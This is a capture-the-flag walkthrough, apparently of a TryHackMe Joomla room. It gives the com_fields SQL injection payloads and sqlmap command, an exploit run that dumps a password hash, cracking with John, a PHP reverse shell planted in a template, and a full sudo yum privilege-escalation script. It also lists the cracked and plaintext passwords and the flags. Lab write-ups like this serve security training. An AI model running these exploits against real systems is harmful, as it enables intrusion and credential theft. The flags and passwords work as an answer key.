#CTF 

## Recon
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.99 seconds
```

```
===============================================================
2023/06/09 06:35:57 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/administrator        (Status: 301) [Size: 241] [--> http://10.10.43.26/administrator/]                                                         
/bin                  (Status: 301) [Size: 231] [--> http://10.10.43.26/bin/]                                                                   
/cache                (Status: 301) [Size: 233] [--> http://10.10.43.26/cache/]                                                                 
/cgi-bin/             (Status: 403) [Size: 210]
/components           (Status: 301) [Size: 238] [--> http://10.10.43.26/components/]                                                            
/images               (Status: 301) [Size: 234] [--> http://10.10.43.26/images/]                                                                
/includes             (Status: 301) [Size: 236] [--> http://10.10.43.26/includes/]                                                              
/index.php            (Status: 200) [Size: 9276]
Progress: 2141 / 4615 (46.39%)[ERROR] 2023/06/09 06:36:25 [!] Get "http://10.10.43.26/invoice": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/06/09 06:36:25 [!] Get "http://10.10.43.26/ioncube": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/06/09 06:36:25 [!] Get "http://10.10.43.26/ip": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/language             (Status: 301) [Size: 236] [--> http://10.10.43.26/language/]                                                              
/layouts              (Status: 301) [Size: 235] [--> http://10.10.43.26/layouts/]                                                               
/libraries            (Status: 301) [Size: 237] [--> http://10.10.43.26/libraries/]                                                             
Progress: 2347 / 4615 (50.86%)[ERROR] 2023/06/09 06:36:30 [!] Get "http://10.10.43.26/items": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/media                (Status: 301) [Size: 233] [--> http://10.10.43.26/media/]                                                                 
/modules              (Status: 301) [Size: 235] [--> http://10.10.43.26/modules/]                                                               
/plugins              (Status: 301) [Size: 235] [--> http://10.10.43.26/plugins/]                                                               
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 301) [Size: 237] [--> http://10.10.43.26/templates/]                                                             
/tmp                  (Status: 301) [Size: 231] [--> http://10.10.43.26/tmp/]                                                                   
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/06/09 06:36:48 Finished
===============================================================

```

## Access 

```
searchsploit joomla 3.7.0
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                                                | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                                                                             | php/webapps/43488.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

I am going to use the first 42033.txt
```
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)  
```

Used 
```
sqlmap -u "http://10.10.43.26/administrator/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```


Didnt work. I found a vulnerability for the Joomla version 3.7.0 [here](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py)
`python joomblah.py http://10.10.43.26`

```
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

Used John on the password with bcrypt and found 
`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
`spiderman123`

I logged in with these creds on the /administrator
I navigated to Templates => Beez3 => index.php => replace the content with the content of the reverse shell code.

I open a netcat connection on a port
I navigate to `[http://10.10.233.69/templates/beez3/index.php](http://10.10.233.69/templates/beez3/index.php)`
And catch the connection.

I cant navigate to the /home/jjameson
Instead I navigate to /var/www/html
I cat the configuration.php file and find the password for the root
```
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```
I ssh into jjameson with the password above and get the user flag
`27a260fe3cba712cfdedb1c86d80442e`
## Priv Esc

I type sudo -l
```
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid,
    always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

```

I go to gtfo bin and search for /usr/bin/yum
And find [this](https://gtfobins.github.io/gtfobins/yum/)
I go to sudo section and type one by one in the console the following
```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

And I am root and I get the flag.
`eec3d53292b1821868266858d7fa6f79
`